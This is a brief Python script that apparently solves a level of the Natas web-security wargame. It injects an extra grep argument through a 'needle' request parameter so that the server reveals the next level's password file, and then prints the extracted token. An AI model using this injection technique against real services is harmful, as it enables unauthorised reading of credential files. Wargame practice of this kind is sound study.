import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

response = get(url, auth=(user, password), params={"needle" : "'\\w' /etc/natas_webpass/natas11"})
password = re.findall(r"\w{32}", response.content)[-1]

print(password)
